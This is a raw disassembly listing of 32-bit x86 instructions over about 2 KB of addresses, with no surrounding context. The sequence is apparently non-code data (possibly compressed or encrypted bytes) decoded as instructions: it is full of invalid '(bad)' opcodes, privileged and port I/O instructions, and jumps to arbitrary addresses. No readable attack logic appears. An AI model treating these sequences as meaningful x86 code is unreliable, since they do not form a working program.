  412fb8:	adc    edi,DWORD PTR [ecx]
  412fba:	push   esi
  412fbb:	loope  0x412f6e
  412fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fbe:	push   0xbd58331b
  412fc3:	mov    al,0x6c
  412fc5:	test   ebx,esi
  412fc7:	not    DWORD PTR [ecx+0x7e3f1949]
  412fcd:	imul   edi,DWORD PTR [eax],0xffffffcf
  412fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fd1:	xlat   BYTE PTR ds:[ebx]
  412fd2:	test   eax,0xb79691f
  412fd7:	cmp    al,0xa5
  412fd9:	lmsw   WORD PTR [ecx+0x1cd685d5]
  412fe0:	std    
  412fe1:	(bad)  
  412fe2:	lds    eax,FWORD PTR [ebx]
  412fe4:	das    
  412fe5:	sub    al,0x58
  412fe7:	mov    eax,DWORD PTR [eax+0x2f]
  412fea:	out    dx,al
  412feb:	int    0xff
  412fed:	les    edx,FWORD PTR [edi+0x7fc4ce80]
  412ff3:	inc    edi
  412ff4:	pop    esi
  412ff5:	shl    BYTE PTR [eax-0x1a],cl
  412ff8:	pop    esi
  412ff9:	jecxz  0x412f9b
  412ffb:	sub    ah,BYTE PTR [eax]
  412ffd:	mov    edi,0x87d78285
  413002:	ret    
  413003:	pop    edi
  413004:	and    BYTE PTR [edx+ecx*2+0x45952317],dl
  41300b:	mov    edi,0x85d25e2e
  413010:	xchg   edx,eax
  413011:	sub    BYTE PTR [ebx],ch
  413013:	mov    esp,0x663321da
  413018:	jbe    0x412fc5
  41301a:	ss xchg esp,eax
  41301c:	ds pop ebx
  41301e:	in     al,dx
  41301f:	mov    bl,BYTE PTR [eax-0x4bda6229]
  413025:	jmp    DWORD PTR [eax+esi*8+0x6e]
  413029:	mov    al,ds:0x26320f3a
  41302e:	bound  esp,QWORD PTR [edx+0x1f]
  413031:	cmp    BYTE PTR [edi-0x43e8bde3],0x37
  413038:	sub    BYTE PTR [ecx+ecx*8+0x1a1ad28],bl
  41303f:	mov    al,0xad
  413041:	in     al,dx
  413042:	pusha  
  413043:	jmp    0x527b:0x19347ba
  41304a:	and    DWORD PTR cs:[edx+0x1f],edx
  41304e:	jne    0x413052
  413050:	in     eax,0x16
  413052:	push   esp
  413053:	scas   eax,DWORD PTR es:[edi]
  413054:	push   ebp
  413055:	lods   eax,DWORD PTR ds:[esi]
  413056:	sub    eax,0x46a5e9b5
  41305b:	out    0x9d,eax
  41305d:	xor    DWORD PTR [eax],0x9557b4a6
  413063:	push   edi
  413064:	jg     0x413068
  413066:	cmp    ebx,ebp
  413068:	mov    BYTE PTR [edi-0x70e98ee],cl
  41306e:	jecxz  0x4130e8
  413070:	jle    0x413024
  413072:	ds enter 0xd803,0x22
  413077:	rol    edx,1
  413079:	in     eax,dx
  41307a:	mov    ds:0x61069131,al
  41307f:	outs   dx,DWORD PTR ds:[esi]
  413080:	sbb    ch,BYTE PTR [edx]
  413082:	mov    bl,0xaf
  413084:	imul   esi,DWORD PTR [ecx],0xbf273f1f
  41308a:	in     al,dx
  41308b:	cmp    al,BYTE PTR [eax-0x2]
  41308e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413090:	dec    edi
  413091:	jmp    0x4130b7
  413093:	mov    ebx,0xa094c026
  413098:	pop    ebx
  413099:	pop    edx
  41309a:	fbstp  TBYTE PTR [ebx-0x337ac08c]
  4130a0:	mov    al,0x8b
  4130a2:	inc    esi
  4130a3:	xlat   BYTE PTR ds:[ebx]
  4130a4:	jmp    0x41311c
  4130a6:	jmp    eax
  4130a8:	push   esi
  4130a9:	sub    DWORD PTR [edx],ecx
  4130ab:	mov    gs,WORD PTR [ecx-0x781b9df6]
  4130b1:	push   0xffffffa3
  4130b3:	sti    
  4130b4:	xor    eax,0xfae6c146
  4130b9:	std    
  4130ba:	dec    edi
  4130bb:	ret    0x4215
  4130be:	js     0x4130dc
  4130c0:	lahf   
  4130c1:	xor    edi,DWORD PTR [esi-0x3f0507c3]
  4130c7:	add    ebp,DWORD PTR [ebp-0x6b8f20e9]
  4130cd:	unpckhps xmm5,xmm3
  4130d0:	stc    
  4130d1:	push   ds
  4130d2:	pop    edi
  4130d3:	mov    eax,0x5b828b25
  4130d8:	push   esi
  4130d9:	push   esi
  4130da:	xor    cl,dl
  4130dc:	test   eax,0xd8f732e8
  4130e1:	mov    ebx,0xea0e45f1
  4130e6:	jns    0x4130c8
  4130e8:	sar    BYTE PTR [esi],1
  4130ea:	popf   
  4130eb:	sub    bh,dh
  4130ed:	cld    
  4130ee:	add    edi,DWORD PTR [edx+0x4a664eaf]
  4130f4:	iret   
  4130f5:	es retf 
  4130f7:	lds    eax,FWORD PTR [bx-0x6b]
  4130fb:	push   eax
  4130fc:	icebp  
  4130fd:	mov    eax,ds:0x8f270ff5
  413102:	hlt    
  413103:	iret   
  413104:	mov    al,0xe8
  413106:	ins    BYTE PTR es:[edi],dx
  413107:	jb     0x41315e
  413109:	inc    esi
  41310a:	cmc    
  41310b:	imul   esi,DWORD PTR [ecx+0x342f96cc],0x16ca89f1
  413115:	push   edx
  413116:	jne    0x4130af
  413118:	nop
  413119:	xchg   edi,eax
  41311a:	mov    BYTE PTR [edx-0x3e],bh
  41311d:	xchg   edi,eax
  41311e:	mov    WORD PTR [ebx-0x3fc1ef1d],es
  413124:	imul   edi,ebp,0x1be6a824
  41312a:	xor    DWORD PTR [ebp+0x534c6eb6],edx
  413130:	test   cl,al
  413132:	xchg   BYTE PTR [eax],bl
  413134:	sbb    ebp,DWORD PTR [ebp-0x5d517099]
  41313a:	xchg   esp,eax
  41313b:	xchg   edx,eax
  41313c:	cld    
  41313d:	sub    ebx,DWORD PTR [edx-0x46c544c9]
  413143:	or     esp,DWORD PTR [ebp-0x2a9d96bc]
  413149:	adc    eax,0xc52d1453
  41314e:	cs xchg esi,eax
  413150:	(bad)  
  413151:	xchg   esi,eax
  413152:	in     al,0x8c
  413154:	test   al,0x1c
  413156:	add    DWORD PTR [eax-0x2ad295f5],esi
  41315c:	jo     0x4131d9
  41315e:	push   ds
  41315f:	stos   DWORD PTR es:[edi],eax
  413160:	push   edx
  413161:	push   ebp
  413162:	leave  
  413163:	retf   
  413164:	jbe    0x413131
  413166:	cwde   
  413167:	dec    edi
  413168:	fnstsw WORD PTR [ebp+0x61]
  41316b:	xchg   ecx,eax
  41316c:	mov    bl,BYTE PTR [ebx+esi*1-0x69]
  413170:	pop    es
  413171:	xor    DWORD PTR [esi+0xece23b5],ebp
  413177:	cs (bad) 
  413179:	and    BYTE PTR [edi],ch
  41317b:	cmp    ebp,DWORD PTR [eax-0x67]
  41317e:	mov    ch,0xa6
  413180:	mov    edx,0x493b6719
  413185:	jnp    0x413128
  413187:	pop    edx
  413188:	xchg   dl,bl
  41318a:	sar    DWORD PTR [ebx],0x3a
  41318d:	into   
  41318e:	clc    
  41318f:	stos   BYTE PTR es:[edi],al
  413190:	aaa    
  413191:	lahf   
  413192:	int3   
  413193:	int    0xa1
  413195:	push   ebp
  413196:	(bad)  
  413197:	addr16 jns 0x413175
  41319a:	sub    al,0xbf
  41319d:	xchg   edx,eax
  41319e:	jne    0x4131b4
  4131a0:	not    DWORD PTR ds:0x34f8718
  4131a6:	inc    ebp
  4131a7:	mov    WORD PTR [edx+edx*1-0x44b3bd46],ds
  4131ae:	fs call 0xcb02f08d
  4131b4:	jmp    0x46bf9000
  4131b9:	jl     0x413208
  4131bb:	ja     0x41317d
  4131bd:	arpl   WORD PTR [esi+0x50fc1753],sp
  4131c3:	aaa    
  4131c4:	mov    eax,ds:0x9ffd3a06
  4131c9:	or     cl,BYTE PTR [ecx]
  4131cb:	adc    al,0x2b
  4131cd:	jp     0x413171
  4131cf:	pop    eax
  4131d0:	or     BYTE PTR [esi],dl
  4131d2:	iret   
  4131d3:	fst    DWORD PTR [ecx+0x54]
  4131d6:	jmp    0xefe9c2cb
  4131db:	fucomp st(2)
  4131dd:	das    
  4131de:	mov    ecx,0x649f095a
  4131e3:	(bad)  [ebx]
  4131e5:	test   DWORD PTR [ebp+ebx*1-0x3a7e9c55],eax
  4131ec:	pop    es
  4131ed:	xchg   esi,eax
  4131ee:	mov    ecx,0xe5f6d5f8
  4131f3:	lods   al,BYTE PTR ds:[esi]
  4131f4:	sar    esp,0x84
  4131f7:	jl     0x41326a
  4131f9:	push   ss
  4131fa:	fldcw  WORD PTR [edx+0x59]
  4131fd:	or     bh,BYTE PTR [edx-0x19199683]
  413203:	lock mov ebx,0xfc94172b
  413209:	and    eax,0xfafa4952
  41320e:	xor    DWORD PTR ds:[edx+0xa],ebx
  413212:	mov    cs,WORD PTR [ecx+0xf]
  413215:	mov    ch,0x25
  413217:	add    eax,0x66454892
  41321c:	xchg   edi,eax
  41321d:	aad    0xde
  41321f:	xchg   edi,eax
  413220:	or     cl,BYTE PTR [edx]
  413222:	pop    ds
  413223:	or     al,0xf5
  413225:	xor    cl,BYTE PTR [edi]
  413227:	cmp    eax,DWORD PTR [edx-0x4d]
  41322a:	(bad)  
  41322b:	push   esi
  41322c:	mov    esp,ebp
  41322e:	mov    al,0x31
  413230:	mov    ds:0xc61a20ea,eax
  413235:	add    BYTE PTR [eax-0x11b3367],cl
  41323b:	or     ch,BYTE PTR [eax+0x57]
  41323e:	int3   
  41323f:	(bad)  
  413240:	call   FWORD PTR [esi+0x59]
  413243:	(bad)  
  413244:	(bad)  
  413245:	mov    ch,0x44
  413247:	or     BYTE PTR [edx],cl
  413249:	mov    ah,0x37
  41324b:	loopne 0x4132a4
  41324d:	int    0x4a
  41324f:	ficom  DWORD PTR [edi+eiz*8+0x4d]
  413253:	push   ss
  413254:	push   esp
  413255:	enter  0x6d80,0xbb
  413259:	mov    DWORD PTR [edx-0x5067a98d],ebp
  41325f:	aam    0x2b
  413261:	add    ah,bh
  413263:	inc    ecx
  413264:	sbb    bl,BYTE PTR [edx]
  413266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413267:	inc    eax
  413268:	stos   BYTE PTR es:[edi],al
  413269:	sub    BYTE PTR [edi+0x7882229],dl
  41326f:	add    DWORD PTR [eax-0x5f],esi
  413272:	je     0x413272
  413274:	inc    ebx
  413275:	bound  ecx,QWORD PTR [eax+0x205c9b88]
  41327b:	adc    edi,DWORD PTR [esi]
  41327d:	(bad)
  413280:	aam    0x3d
  413282:	pop    edx
  413283:	shr    BYTE PTR [esi-0x5d57fdd7],cl
  413289:	loope  0x4132b7
  41328b:	leave  
  41328c:	sar    BYTE PTR [edx-0x44bf7a4f],cl
  413292:	bound  ebp,QWORD PTR [eax+edi*4-0x44114b3c]
  413299:	jbe    0x41328b
  41329b:	sub    al,0x24
  41329d:	push   ecx
  41329e:	pop    DWORD PTR [ecx-0x7b]
  4132a1:	test   esp,edi
  4132a3:	jns    0x4132f3
  4132a5:	dec    esi
  4132a6:	push   0xce9d5080
  4132ab:	xchg   BYTE PTR [eax],dh
  4132ad:	push   eax
  4132ae:	out    0xfa,eax
  4132b0:	pop    esi
  4132b1:	aaa    
  4132b2:	lods   al,BYTE PTR ds:[esi]
  4132b3:	fwait
  4132b4:	adc    eax,DWORD PTR [ecx+edi*1-0x25]
  4132b8:	mov    ebx,DWORD PTR [ecx]
  4132ba:	adc    DWORD PTR [ecx],ebp
  4132bc:	xor    eax,0x52d3269
  4132c1:	gs fmulp st(2),st
  4132c4:	inc    ebp
  4132c5:	add    ebp,DWORD PTR es:[eax-0x60]
  4132c9:	push   edx
  4132ca:	mov    DWORD PTR [esp+edx*1],ebp
  4132cd:	and    DWORD PTR [esi-0x5d],esi
  4132d0:	pop    es
  4132d1:	mov    ch,0x7b
  4132d3:	pop    eax
  4132d4:	int3   
  4132d5:	out    0xb9,al
  4132d7:	mov    ah,0xbf
  4132d9:	test   DWORD PTR [ebx+0x7d],0x76271f24
  4132e0:	inc    eax
  4132e1:	inc    ebx
  4132e2:	cld    
  4132e3:	faddp  st(3),st
  4132e5:	pop    ss
  4132e6:	and    ax,si
  4132e9:	xor    BYTE PTR [edi-0x3e47be55],bh
  4132ef:	jge    0x413359
  4132f1:	adc    bh,ch
  4132f3:	sbb    bh,cl
  4132f5:	jmp    0x76f58197
  4132fa:	int    0xea
  4132fc:	mov    WORD PTR [edi*4+0x2d7c8d29],cs
  413303:	fild   QWORD PTR [edi+edi*1]
  413306:	cmp    eax,0x4e9aa4f
  41330c:	outs   dx,DWORD PTR ds:[esi]
  41330d:	pop    es
  41330e:	fmul   QWORD PTR [ebp+0x3f]
  413311:	jge    0x4132b3
  413313:	test   DWORD PTR [edi-0xcbb1248],0xd48baea1
  41331d:	inc    edi
  41331e:	out    0x91,eax
  413320:	pop    esi
  413321:	enter  0x3a8,0x34
  413325:	out    dx,al
  413326:	adc    ch,al
  413328:	sbb    ah,bl
  41332a:	push   ebp
  41332b:	cmp    bh,ch
  41332d:	div    DWORD PTR [ebx+0x6accec78]
  413333:	dec    ebx
  413334:	mov    BYTE PTR [edx+0x55],0xdf
  413338:	out    dx,eax
  413339:	dec    esi
  41333a:	mov    al,0xe8
  41333c:	fwait
  41333d:	mov    eax,0x43d4e9b8
  413342:	mov    BYTE PTR [edi],ah
  413344:	xchg   ebp,eax
  413345:	gs and eax,0xc8c94eb6
  41334b:	clc    
  41334c:	mov    edx,0x191f69b6
  413351:	push   ss
  413352:	mov    gs,WORD PTR [edx-0x47395383]
  413358:	pop    ss
  413359:	fdiv   DWORD PTR [ecx+0x6c46c67f]
  41335f:	mov    ebx,es
  413361:	ja     0x4132fe
  413363:	pop    ebp
  413364:	dec    eax
  413365:	xor    ah,cl
  413367:	sub    BYTE PTR [eax-0x45435fb6],bh
  41336d:	out    0x97,al
  41336f:	fwait
  413370:	add    DWORD PTR [eax-0x3d],0x38989b2f
  413377:	mov    ds:0xe37ee43b,al
  41337c:	fmulp  st(4),st
  41337e:	out    0x81,eax
  413380:	dec    esp
  413381:	lods   al,BYTE PTR ds:[esi]
  413382:	test   eax,0x64f23989
  413387:	add    eax,0xcc1fdfca
  41338c:	in     eax,0xd5
  41338e:	dec    eax
  41338f:	jle    0x413346
  413391:	pusha  
  413392:	cmp    al,0x4f
  413395:	mov    ebp,0xd66e93c4
  41339a:	bound  eax,QWORD PTR [esi+0x63]
  41339d:	add    eax,0x52d273f3
  4133a2:	cmp    eax,0x4287d127
  4133a7:	ror    BYTE PTR [eax+0x5ae0e2c6],1
  4133ad:	xor    DWORD PTR [esi],esp
  4133af:	out    dx,eax
  4133b0:	(bad)  
  4133b2:	mov    al,0x82
  4133b4:	ror    DWORD PTR [ecx+0x6d3fd7df],0xb6
  4133bb:	repnz test eax,0xc134f178
  4133c1:	div    DWORD PTR [edx-0x4c]
  4133c4:	mov    BYTE PTR [edx],ah
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	je     0x41337f
  4133c9:	adc    al,0x90
  4133cb:	pop    esp
  4133cc:	mov    DWORD PTR [ebp+eax*1+0x4],edx
  4133d0:	jmp    0x4133cc
  4133d2:	int3   
  4133d3:	add    DWORD PTR [ecx],ebp
  4133d5:	fsub   QWORD PTR [eax+0x45]
  4133d8:	adc    BYTE PTR [ecx-0x22],bl
  4133db:	inc    ebx
  4133dc:	(bad)  
  4133dd:	jno    0x41341d
  4133df:	ror    DWORD PTR [edx-0x39],0x2b
  4133e3:	test   dl,dh
  4133e5:	sub    dh,BYTE PTR [edx-0x71bdb08a]
  4133eb:	(bad)  
  4133ec:	xor    DWORD PTR [edx-0x4b21622a],ebx
  4133f2:	ror    DWORD PTR [edx],0xbc
  4133f5:	sub    BYTE PTR [eax+0x6e7059be],ch
  4133fb:	gs ins BYTE PTR es:[edi],dx
  4133fd:	aam    0xda
  4133ff:	cmp    ch,BYTE PTR [esi+0x43]
  413402:	xchg   ecx,eax
  413403:	ins    DWORD PTR es:[edi],dx
  413404:	sbb    BYTE PTR [ebx-0x59012df7],dh
  41340a:	sub    BYTE PTR [esi],0xd1
  41340d:	popf   
  41340e:	push   ebp
  41340f:	ins    DWORD PTR es:[edi],dx
  413410:	xchg   esp,eax
  413411:	inc    eax
  413412:	nop
  413413:	add    al,cl
  413415:	int    0x88
  413417:	jge    0x413435
  413419:	int3   
  41341a:	cmp    ebx,esi
  41341c:	xor    dh,BYTE PTR [edx]
  41341e:	pop    ds
  41341f:	mov    al,0x10
  413421:	mov    ecx,0x36c222f7
  413426:	push   ebx
  413427:	retf   0x7f8b
  41342a:	cdq    
  41342b:	(bad)
  41342e:	loopne 0x4133c0
  413430:	lds    ecx,FWORD PTR [edx+0x530a7c88]
  413436:	mov    dh,0x21
  413438:	fdivr  st,st(3)
  41343a:	sahf   
  41343b:	ret    0xa9c7
  41343e:	fs inc ebx
  413440:	cmp    eax,DWORD PTR [edi]
  413442:	jecxz  0x4133f3
  413444:	jb     0x4133e8
  413446:	retf   0x89a3
  413449:	xor    BYTE PTR [edi+0x7a439cd8],0x3a
  413450:	jp     0x413480
  413452:	xor    ebp,edx
  413454:	mov    WORD PTR [ebx],es
  413456:	cdq    
  413457:	call   0x51590381
  41345c:	pop    ebx
  41345d:	mov    ebp,esi
  41345f:	or     eax,DWORD PTR [ebx+0x77]
  413462:	test   eax,0x4fb93b18
  413467:	or     edi,edi
  413469:	add    al,0x39
  41346b:	xchg   ecx,eax
  41346c:	dec    eax
  41346d:	mov    ds:0xefdd87cd,eax
  413472:	xor    dh,dl
  413474:	pop    eax
  413475:	cdq    
  413476:	int    0x35
  413478:	inc    ebp
  413479:	mov    ss,edx
  41347b:	push   ebx
  41347c:	pop    edx
  41347d:	loopne 0x413425
  41347f:	scas   al,BYTE PTR es:[edi]
  413480:	lea    esi,[edi+ebp*4]
  413483:	call   0xa627:0xa3679a5b
  41348a:	dec    edi
  41348b:	jnp    0x41346b
  41348d:	jp     0x413472
  41348f:	jne    0x413457
  413491:	pop    ds
  413492:	jne    0x413481
  413494:	js     0x413421
  413496:	mov    esi,0xdd549a99
  41349b:	cmp    al,BYTE PTR [ebx]
  41349d:	sbb    BYTE PTR [edi+0x5e],0xd4
  4134a1:	jg     0x4134d7
  4134a3:	and    BYTE PTR [ebx-0x7e7551ca],0xda
  4134aa:	mov    ds:0x1082081b,al
  4134af:	push   eax
  4134b0:	rol    BYTE PTR [ebp+0x3b],0x8b
  4134b4:	mov    dh,0xbd
  4134b6:	pop    edi
  4134b7:	loope  0x413466
  4134b9:	iret   
  4134ba:	xchg   edx,eax
  4134bb:	and    ch,BYTE PTR ds:0xb4b77899
  4134c1:	loop   0x4134e3
  4134c3:	pop    edx
  4134c4:	pop    esi
  4134c5:	dec    esi
  4134c6:	xchg   ecx,eax
  4134c7:	lea    ebp,[eax]
  4134c9:	jne    0x413469
  4134cb:	or     esp,DWORD PTR [eax-0x22]
  4134ce:	pop    edi
  4134cf:	test   DWORD PTR [ebx+0x3d95fbbf],edx
  4134d5:	inc    edx
  4134d6:	mov    eax,ds:0xc9d52d63
  4134db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134dc:	ret    0x77ec
  4134df:	mov    ebp,0x4737dabf
  4134e4:	and    al,0x74
  4134e6:	or     eax,0x3b64b0bd
  4134eb:	cmp    ecx,DWORD PTR [ebx]
  4134ed:	aaa    
  4134ee:	retf   0x314e
  4134f1:	loop   0x4134fd
  4134f3:	dec    esi
  4134f4:	sub    al,0x49
  4134f6:	jne    0x41354f
  4134f8:	loop   0x413573
  4134fa:	das    
  4134fb:	(bad)  
  4134fc:	and    esi,ebx
  4134fe:	in     eax,dx
  4134ff:	add    edi,DWORD PTR [ecx]
  413501:	xchg   ebx,edx
  413503:	inc    edi
  413504:	pop    ss
  413505:	repz jmp 0x679e86a6
  41350b:	test   DWORD PTR [ebx+eax*8+0x3d],0x68380835
  413513:	and    eax,0xc5369219
  413518:	inc    BYTE PTR [esi+0x29]
  41351b:	mov    ecx,DWORD PTR [ecx-0xea9593b]
  413521:	(bad)  
  413522:	retf   
  413523:	inc    ebx
  413524:	(bad)  
  413525:	pop    esp
  413526:	lahf   
  413527:	mov    esi,0xa841eed7
  41352c:	mov    eax,ds:0x6157cfda
  413531:	xchg   ebp,eax
  413532:	outs   dx,DWORD PTR ds:[esi]
  413533:	ins    BYTE PTR es:[edi],dx
  413534:	in     al,dx
  413535:	pop    esi
  413536:	inc    ebp
  413537:	(bad)
  41353a:	pop    ds
  41353b:	call   0x5d408b18
  413540:	pop    esi
  413541:	sahf   
  413542:	ds mov bh,0x58
  413545:	mov    edx,0x8ed9265
  41354a:	jno    0x413553
  41354c:	pop    edi
  41354d:	les    eax,FWORD PTR [eax-0x4d]
  413550:	pusha  
  413551:	mov    edx,0x9b59abd2
  413556:	lods   al,BYTE PTR ds:[esi]
  413557:	sbb    DWORD PTR [ebx+0x54],edi
  41355a:	and    eax,0x787ba78f
  41355f:	(bad)  
  413560:	ins    BYTE PTR es:[edi],dx
  413561:	jle    0x413558
  413563:	cdq    
  413564:	gs pop edx
  413566:	test   BYTE PTR [eax],ah
  413568:	adc    BYTE PTR [ecx],0x75
  41356b:	lods   al,BYTE PTR ds:[esi]
  41356c:	popa   
  41356d:	jmp    0x43dc:0xd4148ab1
  413574:	neg    DWORD PTR [esi]
  413576:	dec    ebx
  413577:	ins    DWORD PTR es:[edi],dx
  413578:	clc    
  413579:	leave  
  41357a:	je     0x413534
  41357c:	rol    dh,1
  41357e:	pop    esp
  41357f:	mov    edx,0xf142dd65
  413584:	sub    ecx,DWORD PTR [eax-0x164a4e06]
  41358a:	ret    
  41358b:	mov    dh,0x22
  41358d:	sbb    esi,DWORD PTR [esi+0xf]
  413590:	stos   DWORD PTR es:[edi],eax
  413591:	mov    esp,0x69d0a880
  413596:	add    DWORD PTR [edi-0x67],ebp
  413599:	outs   dx,DWORD PTR ds:[esi]
  41359a:	or     ch,ah
  41359c:	mov    ah,0xea
  41359e:	(bad)  
  4135a1:	pop    eax
  4135a2:	jns    0x4135dd
  4135a4:	mov    ds:0xfe9e7d5b,al
  4135a9:	mov    bh,0xa2
  4135ab:	(bad)
  4135ae:	or     al,0x23
  4135b0:	xchg   DWORD PTR [eax+0x30],ecx
  4135b3:	pop    ebp
  4135b4:	fwait
  4135b5:	call   FWORD PTR [eax-0x50]
  4135b8:	cmp    eax,edx
  4135ba:	loope  0x4135c6
  4135bc:	outs   dx,BYTE PTR ds:[esi]
  4135bd:	jno    0x4135c5
  4135bf:	pushf  
  4135c0:	(bad)  
  4135c1:	int3   
  4135c2:	jnp    0x4135a6
  4135c4:	lods   al,BYTE PTR ds:[esi]
  4135c5:	retf   
  4135c6:	enter  0x553c,0xc8
  4135ca:	push   ds
  4135cb:	imul   ebp,DWORD PTR [ecx],0x8f535d5f
  4135d1:	mov    ebp,0xad241876
  4135d6:	in     al,dx
  4135d7:	dec    esp
  4135d8:	in     al,dx
  4135d9:	mov    DWORD PTR [esi],esi
  4135db:	(bad)  
  4135dc:	repnz mov ebx,0x66f76a
  4135e2:	mov    al,ds:0x2c27698e
  4135e7:	sub    eax,0x620829cd
  4135ec:	push   0x76
  4135ee:	push   ss
  4135ef:	or     esi,DWORD PTR [ebp+0x74]
  4135f2:	inc    ecx
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f5:	sub    cl,dh
  4135f7:	bound  edx,QWORD PTR [eax]
  4135f9:	test   BYTE PTR [eax],0xc0
  4135fc:	or     eax,0x8a9cd80
  413601:	shl    esp,1
  413603:	jle    0x4135d7
  413605:	sbb    al,0x39
  413607:	jecxz  0x413612
  413609:	out    0x86,al
  41360b:	pop    ecx
  41360c:	jbe    0x413594
  41360e:	es leave 
  413610:	bound  eax,QWORD PTR [edi]
  413612:	push   ebp
  413613:	sbb    eax,DWORD PTR [edx]
  413615:	rcl    esp,1
  413617:	push   esp
  413618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413619:	or     al,0x7b
  41361b:	das    
  41361c:	mov    ebp,0xe4117744
  413621:	pop    edi
  413622:	pop    esi
  413623:	gs ins DWORD PTR es:[edi],dx
  413625:	(bad)  
  413626:	sahf   
  413627:	and    DWORD PTR [ebx-0x34ec2d4c],0xe25a7372
  413631:	in     al,dx
  413632:	jo     0x413606
  413634:	push   es
  413635:	sub    eax,0x4690fbbd
  41363a:	jmp    0xa6cc6ca1
  41363f:	jns    0x413665
  413641:	jp     0x413652
  413643:	(bad)  [eax-0x3e667418]
  413649:	or     eax,0xb9e22d78
  41364e:	test   BYTE PTR [ecx],cl
  413650:	jmp    0x7cc47fb3
  413655:	xor    edi,edx
  413657:	xor    bh,cl
  413659:	shld   DWORD PTR [edx],ecx,cl
  41365c:	ja     0x41366f
  41365e:	mov    WORD PTR [esi+0x60],?
  413661:	pop    ds
  413662:	int    0xe6
  413664:	mov    bl,0xaa
  413666:	dec    edi
  413667:	scas   al,BYTE PTR es:[edi]
  413668:	jae    0x413622
  41366a:	or     al,BYTE PTR [esi]
  41366c:	int    0xcf
  41366e:	call   0x9dce:0xb9527d38
  413675:	popa   
  413676:	push   esi
  413677:	pusha  
  413678:	inc    edx
  413679:	dec    esi
  41367a:	fbstp  TBYTE PTR [esi]
  41367c:	inc    ebx
  41367d:	fmul   QWORD PTR [edi]
  41367f:	es cmp dh,ch
  413682:	je     0x413649
  413684:	popa   
  413685:	leave  
  413686:	shl    DWORD PTR [eax-0x3b284647],cl
  41368c:	adc    ah,BYTE PTR [edi-0x8]
  41368f:	push   es
  413690:	push   cs
  413691:	mov    ds:0x32e7c695,al
  413696:	shl    DWORD PTR [esi-0xd],1
  413699:	add    DWORD PTR [edi],eax
  41369b:	ds cwde 
  41369d:	popf   
  41369e:	and    esi,DWORD PTR [edi]
  4136a0:	out    0x14,eax
  4136a2:	mov    eax,ds:0xa924411f
  4136a7:	push   edi
  4136a8:	test   dl,0x1b
  4136ab:	and    al,bh
  4136ad:	jp     0x4136b8
  4136af:	and    DWORD PTR [edi+edi*4-0x77],ecx
  4136b3:	inc    eax
  4136b4:	cmp    BYTE PTR [edx-0x1b],bl
  4136b7:	into   
  4136b8:	mov    ds:0x155da66b,eax
  4136bd:	sar    DWORD PTR [edx+esi*2],cl
  4136c0:	ins    DWORD PTR es:[edi],dx
  4136c1:	xor    DWORD PTR [esi+0x31178ae4],0x4efc38a3
  4136cb:	mov    eax,ds:0x4a489916
  4136d0:	xor    edx,edi
  4136d2:	jno    0x413729
  4136d4:	and    DWORD PTR ds:0x7610e17b,ebx
  4136da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136db:	xor    DWORD PTR [eax-0x43dff7b1],edi
  4136e1:	jne    0x41372d
  4136e3:	sub    ch,ch
  4136e5:	(bad)  
  4136e7:	pusha  
  4136e8:	mov    eax,ds:0xfdd8b65c
  4136ed:	int3   
  4136ee:	ins    BYTE PTR es:[edi],dx
  4136ef:	pop    ebp
  4136f0:	mov    al,ds:0xd3eef988
  4136f5:	sub    BYTE PTR [ebp+0x6926bcac],al
  4136fb:	pushf  
  4136fc:	fninit 
  4136fe:	test   ch,dl
  413700:	or     BYTE PTR [eax+ebx*2+0x697fc277],ch
  413707:	cdq    
  413708:	push   ebx
  413709:	aaa    
  41370a:	mov    ds:0x96d1b872,eax
  41370f:	push   esi
  413710:	inc    edx
  413711:	retf   
  413712:	mov    ebp,0x822f8aef
  413717:	fstp   st(1)
  413719:	aas    
  41371a:	inc    eax
  41371b:	test   DWORD PTR [ecx],0xf2c0b2e0
  413721:	adc    bl,bh
  413723:	lods   eax,DWORD PTR ds:[esi]
  413724:	in     al,dx
  413725:	adc    eax,0x5f1e347e
  41372a:	arpl   WORD PTR [ebx-0x1b],dx
  41372d:	lods   al,BYTE PTR ds:[esi]
  41372e:	mov    fs,WORD PTR [ebx+esi*2]
  413731:	mov    ds:0x2b8402e0,al
  413736:	in     eax,dx
  413737:	data16 fdivp st(0),st
  41373a:	das    
  41373b:	ss int3 
  41373d:	out    dx,eax
  41373e:	inc    ebp
  41373f:	mov    dl,0x80
  413741:	sub    ah,dl
  413743:	push   ebp
  413744:	ret    
  413745:	popf   
  413746:	cmp    edx,DWORD PTR [edi+ebp*4-0x6a]
  41374a:	or     edi,DWORD PTR [ecx]
  41374c:	fs sahf 
  41374e:	xchg   esi,eax
  41374f:	nop
  413750:	or     DWORD PTR [ebx],ebx
  413752:	adc    BYTE PTR [edx-0x47],cl
  413755:	inc    edx
  413756:	dec    esp
  413757:	jae    0x4137a0
  413759:	(bad)  
  41375a:	icebp  
  41375b:	mov    al,0xdd
  41375d:	xchg   DWORD PTR [edx-0x49],esp
  413760:	leave  
  413761:	cmp    al,0xb
  413763:	pop    edx
  413764:	fistp  DWORD PTR [ebp-0x2a8a2982]
  41376a:	pop    ecx
  41376b:	(bad)  
  41376d:	rol    DWORD PTR [edx-0x11],0x65
  413771:	pop    edi
  413772:	sar    ecx,0x4b
  413775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413776:	pop    esi
  413777:	mov    WORD PTR [edi+0x63e765da],ss
  41377d:	in     al,dx
  41377e:	mov    esp,0xdb7a4b08
  413783:	sahf   
  413784:	pop    es
  413785:	and    esp,ebx
  413787:	add    bl,BYTE PTR [edi-0x57]
  41378a:	neg    BYTE PTR [edx+0x73]
  41378d:	xor    esp,DWORD PTR [edx+eiz*8]
  413790:	inc    edi
  413791:	pop    edi
  413792:	(bad)  
  413793:	sub    eax,0xd86f677c
  413798:	into   
  413799:	int    0x5f
  41379b:	sti    
  41379c:	add    eax,0x1dd3b0c4
  4137a1:	loope  0x413764
  4137a3:	xchg   edi,eax
  4137a4:	push   0xffffffa4
  4137a6:	inc    esi
  4137a7:	dec    ebp
  4137a8:	inc    esi
